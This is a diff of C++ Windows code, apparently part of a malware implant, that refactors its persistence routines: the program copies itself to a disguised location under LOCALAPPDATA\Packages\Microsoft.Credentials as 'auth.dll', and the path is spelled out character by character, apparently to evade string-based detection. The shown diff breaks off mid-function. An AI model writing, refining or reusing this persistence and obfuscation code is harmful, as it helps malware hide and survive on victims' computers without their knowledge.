@@ -78,30 +78,32 @@ std::wstring getExecutablePath() {
     return std::wstring(path_buf.begin(), path_buf.end());
 }
 
-} // namespace
-bool isRunningFromPersistence() {
-    std::wstring sourcePath = getExecutablePath();
-    const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
-    const wchar_t* userPath = L"%LOCALAPPDATA%\\Microsoft\\Vault";
-    const wchar_t* persistDir = isAdmin() ? adminPath : userPath;
-    wchar_t expandedDir[MAX_PATH];
-    ExpandEnvironmentStringsW(persistDir, expandedDir, MAX_PATH);
-    return wcsstr(sourcePath.c_str(), expandedDir) != nullptr;
-}
-void establishPersistence() {
-    std::wstring sourcePath = getExecutablePath();
-
-    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', L'A', L'P', L'P', L'D', L'A', L'T', L'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
+std::wstring getPersistencePath() {
+    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
     wchar_t expanded[MAX_PATH];
     ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
     std::wstring userPersistPath = expanded;
     std::wstring fileName = L"\\auth.dll";
-    std::wstring persistPath = userPersistPath + fileName;
+    return userPersistPath + fileName;
+}
+
+} // namespace
+bool isRunningFromPersistence() {
+    std::wstring sourcePath = getExecutablePath();
+    std::wstring persistPath = getPersistencePath();
+    return lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0;
+}
+void establishPersistence() {
+    std::wstring sourcePath = getExecutablePath();
+    std::wstring persistPath = getPersistencePath();
 
     if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
         return; // Already running from persistence location
     }
 
+    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
+    wchar_t expanded[MAX_PATH];
+    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
     CreateDirectoryW(expanded, NULL);
     CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
 
